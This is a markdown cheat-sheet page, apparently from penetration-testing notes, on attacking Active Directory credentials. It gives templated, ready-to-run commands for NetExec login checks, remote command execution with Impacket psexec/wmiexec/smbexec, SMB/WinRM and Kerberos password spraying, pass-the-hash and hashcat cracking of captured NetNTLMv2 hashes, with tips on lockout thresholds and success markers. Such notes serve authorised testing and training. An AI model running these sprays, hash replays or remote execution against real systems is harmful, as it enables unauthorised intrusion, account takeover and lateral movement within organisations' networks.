---
title: AD credentials and access
order: 3
tags: [ad, credentials, netexec, smb, kerberos]
---

## Domain or local login

Use the account's actual authority. A successful login does not establish administrator access.

```bash
# Domain account
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}'
# Local account
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' --local-auth
```

[Domain authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain), [local authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-local).

## Reuse one known credential

- [ ] Check [password policy](active-directory/ad-enumeration#password-policy-and-kerberos-controls) before repeated attempts.
- [ ] Test one intended host and service; record authority, result and actual access.
- [ ] Read [SMB shares](services/common-services#smb) and [remote access](services/remote-access#winrm-checks-and-shell) with the permissions obtained.

[Lockout considerations](https://www.netexec.wiki/smb-protocol/password-spraying).

## Remote execution

Requires administrative access and a working remote execution method. Verify the resulting identity before treating access as proof.

```bash
# NetExec SMB command
nxc smb {{RHOST}} -u '{{USER}}' -p '{{PASS}}' -x whoami
# Impacket execution
impacket-psexec '{{USER}}:{{PASS}}'@{{RHOST}}
impacket-wmiexec '{{USER}}:{{PASS}}'@{{RHOST}}
impacket-smbexec '{{USER}}:{{PASS}}'@{{RHOST}}
```

Use the method that matches the host and recovered credential. NetExec's admin indicator is a lead; check the command result itself. [NetExec execution](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command), [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).

## Kerberos authentication

Set RHOST to the target's FQDN and DC to the KDC address.

```bash
nxc smb {{RHOST}} -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' -k --kdcHost {{DC}}
```

Check [DNS and time](active-directory/kerberos#kerberos-dns-or-clock-failure) first. [Source](https://www.netexec.wiki/getting-started/using-kerberos).

## Password spraying

Spray harvested lists against one service at a time. Check the [password policy](active-directory/ad-enumeration#password-policy-and-kerberos-controls) for a lockout threshold first. users.txt and passwords.txt hold one value per line on Kali. Repeat per target box, emptying cracked pairs between rounds.

```bash
nxc smb {{RHOST}} -u users.txt -p passwords.txt --continue-on-success
nxc winrm {{RHOST}} -u users.txt -p passwords.txt --continue-on-success
```

`(Pwn3d!)` or `STATUS_SUCCESS` marks a working pair. [NetExec SMB authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain).

## Pass-the-Hash

Replay an NT hash where a password would otherwise go. Set NTHASH to the hash after the colon in `aad3b435b51404eeaad3b435b51404ee:<NTHASH>`.

```bash
impacket-psexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
impacket-wmiexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
impacket-smbexec -hashes ':{{NTHASH}}' '{{DOMAIN}}/{{USER}}'@{{RHOST}}
```

Requires administrator on the target; a domain-admin hash reaches the controller directly. Verify the resulting identity. [Impacket examples](https://github.com/fortra/impacket/tree/master/examples).

## Kerberos password spraying

Check the domain lockout policy first. Spray one candidate password against a reviewed users.txt; --safe aborts if Kerbrute observes a lockout. PASS is the single candidate, not necessarily a known valid password.

```bash
/home/kali/tools/kerbrute/kerbrute passwordspray --safe --dc '{{DC}}' -d '{{DOMAIN}}' users.txt '{{PASS}}'
```

Kerberos password sprays increment failed-login counts. Stop after a useful success and verify the account's authority. [Kerbrute password spraying](https://github.com/ropnop/kerbrute#password-spray).

## Crack a captured NetNTLMv2 response

Use this only for captured NetNTLMv2 material, such as a Responder SMB capture. It is not the format produced by Kerberoasting or AS-REP roasting.

```bash
hashcat -m 5600 ntlmv2.txt /home/kali/tools/wordlists/rockyou.txt
```

[Responder capture formats and cracking](https://github.com/lgandx/Responder), [hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes).
